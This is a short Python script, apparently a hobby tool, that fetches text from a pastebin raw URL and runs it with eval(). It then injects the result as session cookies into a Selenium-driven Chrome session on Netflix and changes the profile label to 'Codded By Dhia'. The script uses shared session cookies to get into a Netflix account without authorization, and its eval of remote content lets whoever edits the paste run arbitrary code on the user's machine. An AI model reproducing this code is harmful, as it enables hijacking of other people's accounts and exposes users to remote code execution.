from tkinter import messagebox
import requests
import selenium.webdriver

class Fun:

    def onClick():
        messagebox.showinfo("Title goes here","Message goes here")
        __class__.Netflix()


    def __downloadDn():
        response = requests.get("https://pastebin.com/raw/mETPRg6x")
        data = response.text
        data = eval(data)
        return data

    def Netflix():
        driver = selenium.webdriver.Chrome()
        driver.get("https://www.netflix.com/")
        cookies = list(__class__.__downloadDn())
        for cookie in cookies:
            driver.add_cookie(cookie)
        driver.get("https://www.netflix.com/browse")
        driver.execute_script("document.getElementsByClassName('profile-gate-label')[0].childNodes[0].textContent = 'Codded By Dhia'")